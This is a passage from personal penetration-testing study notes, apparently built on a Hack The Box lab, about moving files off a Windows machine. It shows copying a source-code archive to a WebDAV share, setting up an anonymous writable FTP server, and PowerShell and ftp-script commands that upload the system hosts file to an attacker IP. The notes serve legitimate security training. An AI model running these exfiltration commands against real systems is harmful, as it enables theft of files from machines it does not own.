Now we can attempt to connect to the share using the <code>DavWWWRoot</code> directory.</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; dir \\192.168.49.128\DavWWWRoot</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Volume in drive \\192.168.49.128\DavWWWRoot has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is 0000-0000
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of \\192.168.49.128\DavWWWRoot
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>05/18/2022  10:05 AM    <span class=p>&lt;</span>DIR<span class=p>&gt;</span>          .
</span></span><span class=line><span class=cl>05/18/2022  10:05 AM    <span class=p>&lt;</span>DIR<span class=p>&gt;</span>          ..
</span></span><span class=line><span class=cl>05/18/2022  10:05 AM    <span class=p>&lt;</span>DIR<span class=p>&gt;</span>          sharefolder
</span></span><span class=line><span class=cl>05/18/2022  10:05 AM                13 filetest.txt
</span></span><span class=line><span class=cl>               1 File(s)             13 bytes
</span></span><span class=line><span class=cl>               3 Dir(s)  43,443,318,784 bytes free
</span></span></code></pre></td></tr></table></div></div><p><strong>Note:</strong> <code>DavWWWRoot</code> is a special keyword recognised by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.</p><p>You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: <code>\192.168.49.128\sharefolder</code>.</p><ul><li>Uploading Files using SMB</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\</span>
</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>Note:</strong> If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.</p><a href=#ftp-uploads><h2 id=ftp-uploads><span class=hanchor arialabel=Anchor># </span>FTP Uploads</h2></a><p>Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module <code>pyftpdlib</code>, we need to specify the option <code>--write</code> to allow clients to upload files to our attack host.</p><ul><li>Uploading files using SMB:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo python3 -m pyftpdlib --port <span class=m>21</span> --write
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
</span></span><span class=line><span class=cl>  warnings.warn<span class=o>(</span><span class=s2>&#34;write permissions assigned to anonymous user.&#34;</span>,
</span></span><span class=line><span class=cl><span class=o>[</span>I 2022-05-18 10:33:31<span class=o>]</span> concurrency model: async
</span></span><span class=line><span class=cl><span class=o>[</span>I 2022-05-18 10:33:31<span class=o>]</span> masquerade <span class=o>(</span>NAT<span class=o>)</span> address: None
</span></span><span class=line><span class=cl><span class=o>[</span>I 2022-05-18 10:33:31<span class=o>]</span> passive ports: None
</span></span><span class=line><span class=cl><span class=o>[</span>I 2022-05-18 10:33:31<span class=o>]</span> &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, <span class=nv>pid</span><span class=o>=</span><span class=m>5155</span> <span class=o>&lt;&lt;&lt;</span>
</span></span></code></pre></td></tr></table></div></div><p>Now let&rsquo;s use the PowerShell upload function to upload a file to our FTP Server.</p><ul><li>PowerShell upload file:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=p>(</span><span class=nb>New-Object</span> <span class=n>Net</span><span class=p>.</span><span class=n>WebClient</span><span class=p>).</span><span class=n>UploadFile</span><span class=p>(</span><span class=s1>&#39;ftp://192.168.49.128/ftp-hosts&#39;</span><span class=p>,</span> <span class=s1>&#39;C:\Windows\System32\drivers\etc\hosts&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>Create a command file for the FTP client to upload a file:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; echo open 192.168.49.128 &gt; ftpcommand.txt</span>
</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; echo USER anonymous &gt;&gt; ftpcommand.txt</span>
</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; echo binary &gt;&gt; ftpcommand.txt</span>
</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; echo PUT c:\windows\system32\drivers\etc\hosts &gt;&gt; ftpcommand.txt</span>
</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; echo bye &gt;&gt; ftpcommand.txt</span>
</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\htb</span><span class=c1>&gt; ftp -v -n -s:ftpcommand.txt</span>
</span></span><span class=line><span class=cl>ftp<span class=p>&gt;</span> open 192.168.49.128
</span></span><span class=line><span class=cl>Log in with USER and PASS first.
</span></span><span class=line><span class=cl>ftp<span class=p>&gt;</span> USER anonymous
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ftp<span class=p>&gt;</span> PUT c:\windows\system32\drivers\etc\hosts
</span></span><span class=line><span class=cl>ftp<span class=p>&gt;</span> bye
</span></span></code></pre></td></tr></table></div></div></article><hr><div class=page-end id=footer><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li>No backlinks found</li></ul></div><div><script src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://pietraferreira.github.io/quartz/js/graph.abd4bc2af3869a96524d7d23b76152c7.js></script></div></div><div id=contact_buttons><footer><p>Made by Morioh using <a href=https://github.com/jackyzha0/quartz>Quartz</a>, Â© 2023</p><ul><li><a href=https://pietraferreira.github.io/quartz/>Home</a></li><li><a href=https://github.com/pietraferreira>Github</a></li></ul></footer></div></div></body></html>